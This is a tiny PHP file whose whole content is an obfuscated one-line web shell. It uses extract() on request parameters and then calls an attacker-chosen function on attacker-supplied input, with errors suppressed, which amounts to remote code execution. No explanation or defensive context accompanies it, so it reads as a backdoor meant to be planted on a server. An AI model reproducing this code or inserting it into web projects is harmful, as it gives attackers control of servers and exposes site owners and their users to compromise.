<?php
extract($_REQUEST) && @$except(stripslashes($lock)) && exit;